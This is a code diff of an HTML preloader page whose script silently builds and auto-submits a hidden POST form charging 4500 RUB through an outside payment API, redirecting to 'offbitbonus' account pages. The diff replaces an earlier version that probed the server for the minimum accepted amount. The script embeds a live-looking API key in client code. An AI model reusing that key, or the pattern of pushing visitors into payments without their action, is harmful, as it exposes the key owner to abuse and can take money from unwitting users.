@@ -28,7 +28,6 @@
             border-radius: 56px;
             box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s ease;
         }
 
         .loader-ring {
@@ -122,30 +121,6 @@
             backdrop-filter: blur(4px);
             pointer-events: none;
         }
-
-        /* оверлей ошибки (если вдруг критическая ошибка) */
-        .error-overlay {
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
-            border-radius: 32px;
-            padding: 24px;
-            max-width: 320px;
-            color: white;
-            font-size: 0.9rem;
-            text-align: center;
-        }
-
-        .retry-btn {
-            background: #fbbf24;
-            border: none;
-            margin-top: 20px;
-            padding: 10px 24px;
-            border-radius: 40px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #0f172a;
-        }
     </style>
 </head>
 <body>
@@ -167,50 +142,43 @@
 
 <script>
     (function() {
-        // ----------------------------------------------
-        // Конфигурация API (согласно инструкции)
-        // ----------------------------------------------
-        const API_ENDPOINT = "https://marketplay24.click/api/request/";
-        
-        // начальная сумма, которую мы хотим отправить (может не проходить)
-        let currentAmount = 4500;
-        
-        // минимальная сумма по умолчанию (будет извлечена из ответа сервера)
-        let detectedMinAmount = null;
-        
-        // диапазон для merchant_order_id
-        const MIN_ID = 13577888;
-        const MAX_ID = 99273812;
-        
-        function generateMerchantOrderId() {
-            return Math.floor(Math.random() * (MAX_ID - MIN_ID + 1)) + MIN_ID;
-        }
-        
-        // параметры, которые не меняются
+        // --------------------------------------------------------------
+        // Параметры платежа (полностью соответствуют исходному PHP скрипту)
+        // --------------------------------------------------------------
+        const API_URL = "https://marketplays.pro/api/request";
+        const AMOUNT = 4500;
         const USE_CARD_PAYMENT = "RUB";
         const API_KEY = "e71366079d95b04228fc6482c503a983b99da2e7b17dd6c56780074d0f7e63a2";
         const SUCCESS_URL = "https://bitmom.ru/offbitbonus_106/account/limitex";
         const FAIL_URL = "https://bitmom.ru/offbitbonus_106/account/manual";
         const NOTICE_URL = "https://script.google.com/macros/s/AKfycbwhp6cuv7hKzSTcFY0tB8QwPrw4y_oWwpvBjRf1o0uUReggq12ckyDZ-xbwfoxbqak/exec";
-        
-        // Функция отправки формы (скрытая POST)
-        function submitFormWithAmount(amount, merchantOrderId) {
+
+        // Диапазон для merchant_order_id
+        const MIN_ID = 13577888;
+        const MAX_ID = 99273812;
+
+        function generateMerchantOrderId() {
+            return Math.floor(Math.random() * (MAX_ID - MIN_ID + 1)) + MIN_ID;
+        }
+
+        // Создание и отправка скрытой POST-формы (без fetch, без CORS)
+        function sendPaymentForm() {
             const form = document.createElement('form');
             form.method = 'POST';
-            form.action = API_ENDPOINT;
+            form.action = API_URL;
             form.style.display = 'none';
             form.acceptCharset = 'UTF-8';
-            
+
             const fields = {
-                'amount': amount,
-                'merchant_order_id': merchantOrderId,
+                'amount': AMOUNT,
+                'merchant_order_id': generateMerchantOrderId(),
                 'use_card_payment': USE_CARD_PAYMENT,
                 'api_key': API_KEY,
                 'success_url': SUCCESS_URL,
                 'fail_url': FAIL_URL,
                 'notice_url': NOTICE_URL
             };
-            
+
             for (const [name, value] of Object.entries(fields)) {
                 const input = document.createElement('input');
                 input.type = 'hidden';
@@ -218,184 +186,17 @@
                 input.value = value;
                 form.appendChild(input);
             }
-            
+
             document.body.appendChild(form);
             form.submit();
         }
-        
-        // Парсинг ошибки сервера для извлечения минимальной суммы
-        // Пример ответа: {"amount":["Параметр amount должен быть больше или равен 2000"]}
-        // Также возможен текст "не менее 3000" и т.д.
-        function extractMinAmountFromError(responseText) {
-            try {
-                const json = JSON.parse(responseText);
-                if (json.amount && Array.isArray(json.amount) && json.amount.length > 0) {
-                    const msg = json.amount[0];
-                    // ищем число после "больше или равен", "не менее", "минимум"
-                    const patterns = [
-                        /больше или равен\s*(\d+)/i,
-                        /не менее\s*(\d+)/i,
-                        /минимум\s*(\d+)/i,
-                        /должен быть >= (\d+)/i,
-                        /не может быть меньше (\d+)/i,
-                        /минимальная сумма (\d+)/i
-                    ];
-                    for (let pattern of patterns) {
-                        const match = msg.match(pattern);
-                        if (match && match[1]) {
-                            return parseInt(match[1], 10);
-                        }
-                    }
-                    // если прямое указание: "2000" в сообщении
-                    const digits = msg.match(/\b(\d{3,})\b/);
-                    if (digits && digits[1]) {
-                        return parseInt(digits[1], 10);
-                    }
-                }
-                // дополнительные попытки: ключ "message" или другие поля
-                if (json.message && typeof json.message === 'string') {
-                    const match = json.message.match(/(\d+)/);
-                    if (match) return parseInt(match[1], 10);
-                }
-            } catch(e) {
-                // не JSON — возможно обычный текст
-                const text = responseText;
-                const match = text.match(/(\d{3,})/);
-                if (match) return parseInt(match[1], 10);
-            }
-            return null;
-        }
-        
-        // Проверка ошибки на предмет того, что сумма слишком мала
-        function isAmountTooLowError(responseText) {
-            if (!responseText) return false;
-            const lower = responseText.toLowerCase();
-            return lower.includes('amount') && 
-                   (lower.includes('больше') || lower.includes('минимальн') || lower.includes('не менее') || lower.includes('должен быть'));
-        }
-        
-        // Глобальная логика: делаем предзапрос через fetch (без редиректа) для проверки суммы
-        // Если ошибка "мало денег" — корректируем сумму и повторяем через form.submit()
-        // Если успех — сразу делаем редирект через форму, парся ответ (redirect_url)
-        // По инструкции, в случае успеха сервер сам перенаправляет на success_url или шлюз, но
-        // для надёжности: мы анализируем ответ, если там есть redirect_url — используем, иначе просто отправляем форму.
-        // Но по сути POST форма сама перенаправит пользователя. Для автоопределения минимальной суммы мы сначала делаем AJAX.
-        
-        const PRELOADER_DELAY = 1500; // 1.5 сек визуального прелоадера
-        
-        // Флаг, чтобы не запустить несколько цепочек
-        let isProcessing = false;
-        
-        async function processPaymentWithAutoCorrection() {
-            if (isProcessing) return;
-            isProcessing = true;
-            
-            // тестовый merchant_order_id для предварительного запроса
-            const testOrderId = generateMerchantOrderId();
-            let finalAmount = currentAmount;
-            let needRetry = false;
-            let minAmountFromServer = null;
-            
-            // Предварительный AJAX запрос (без редиректа) для валидации суммы
-            try {
-                const params = new URLSearchParams();
-                params.append('amount', finalAmount);
-                params.append('merchant_order_id', testOrderId);
-                params.append('use_card_payment', USE_CARD_PAYMENT);
-                params.append('api_key', API_KEY);
-                params.append('success_url', SUCCESS_URL);
-                params.append('fail_url', FAIL_URL);
-                params.append('notice_url', NOTICE_URL);
-                
-                const response = await fetch(API_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: params.toString(),
-                    mode: 'cors',
-                    credentials: 'omit'
-                });
-                
-                const responseText = await response.text();
-                
-                // Проверяем, является ли ответ ошибкой о минимальной сумме
-                if (isAmountTooLowError(responseText)) {
-                    const extractedMin = extractMinAmountFromError(responseText);
-                    if (extractedMin && extractedMin > 0) {
-                        minAmountFromServer = extractedMin;
-                        finalAmount = extractedMin;
-                        needRetry = true;
-                    } else {
-                        // не удалось определить минимальную сумму — показываем ошибку пользователю
-                        throw new Error(`Не удалось определить минимальную сумму. Ответ сервера: ${responseText.substring(0, 150)}`);
-                    }
-                } 
-                else if (response.ok || response.status < 400) {
-                    // Успешный ответ: возможно, это JSON с редиректом или просто редирект
-                    // Но поскольку мы делали AJAX, сервер не выполнит редирект автоматически.
-                    // Проверим, может в JSON есть поле redirect_url
-                    try {
-                        const json = JSON.parse(responseText);
-                        if (json.redirect_url || json.payment_url) {
-                            const redirectTo = json.redirect_url || json.payment_url;
-                            window.location.href = redirectTo;
-                            return;
-                        }
-                    } catch(e) {}
-                    // Если нет явного редиректа, отправляем обычную форму (которая вызовет редирект)
-                    submitFormWithAmount(finalAmount, generateMerchantOrderId());
-                    return;
-                }
-                else {
-                    // Другая ошибка (не связанная с суммой)
-                    throw new Error(`Ошибка сервера: ${response.status} ${responseText.substring(0, 100)}`);
-                }
-            } catch (fetchError) {
-                // Если ошибка сети или CORS — показываем пользователю ошибку и даём кнопку повтора
-                showFatalError(fetchError.message);
-                return;
-            }
-            
-            // Если требуется повтор с минимальной суммой
-            if (needRetry && finalAmount > 0) {
-                // Отправляем финальную форму с корректной суммой
-                // Задержка не требуется, так как прелоадер уже показан, но для плавности можно 100ms
-                setTimeout(() => {
-                    submitFormWithAmount(finalAmount, generateMerchantOrderId());
-                }, 100);
-            } else if (!needRetry) {
-                // Нормальный поток (если вдруг не сработало)
-                submitFormWithAmount(finalAmount, generateMerchantOrderId());
-            }
-        }
-        
-        function showFatalError(errorMsg) {
-            const container = document.getElementById('preloaderContainer');
-            container.innerHTML = `
-                <div class="error-overlay">
-                    <div style="font-size: 2rem; margin-bottom: 12px;">⚠️</div>
-                    <div style="margin-bottom: 16px;">Не удалось обработать платеж</div>
-                    <div style="font-size: 0.75rem; opacity: 0.8;">${escapeHtml(errorMsg)}</div>
-                    <button class="retry-btn" onclick="location.reload()">Повторить попытку</button>
-                </div>
-            `;
-        }
-        
-        function escapeHtml(str) {
-            return str.replace(/[&<>]/g, function(m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
-        }
-        
-        // Запуск: показываем прелоадер, затем через задержку запускаем логику автоопределения суммы
+
+        // Задержка для красивого прелоудера (1.5 секунды)
+        const PRELOADER_DELAY = 1500;
+
         setTimeout(() => {
-            processPaymentWithAutoCorrection();
+            sendPaymentForm();
         }, PRELOADER_DELAY);
-        
-        // Очистка при выгрузке (необязательно)
-        window.addEventListener('beforeunload', () => {});
     })();
 </script>
 </body>
